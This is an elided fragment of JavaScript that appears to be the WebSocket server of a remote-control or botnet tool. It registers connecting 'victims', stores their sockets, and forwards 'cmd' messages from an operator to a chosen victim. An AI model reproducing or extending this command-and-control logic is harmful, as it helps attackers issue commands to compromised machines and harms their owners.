...
wss.on("connection", (w) => {
  ...
  w.on("message", async (d) => {
    ...
    if (data.data.event == "newClient") {
      console.log(colors.Orange(timestamp) , `New client is now connected | [${data.data.uuid}] `)
    }

    if (data.data.event == "newVictim") {
      victims.push({ uuid: data.data.uuid, w })
      console.log(colors.Orange(timestamp) , `New victim is now connected | [${data.data.uuid}]`)
    }
    if (data.data.event == `ignore`){
      wsSelected.forEach(w => 
        w.w.send(JSON.stringify({
          data:`ignore`
        }))
      )
    }
    if (data.data.event == 'cmd'){
      ...
      // console.log(target)
      sendCmd2(data.data.cmd, data.data.target, data.data.uuid, target[0].w, data.data.data, data.data.role)
    ...
    w.on("close", () => {
      console.log(colors.Orange(timestamp) , `[${data.data.uuid}] has disconnected`);
    });
  });
});
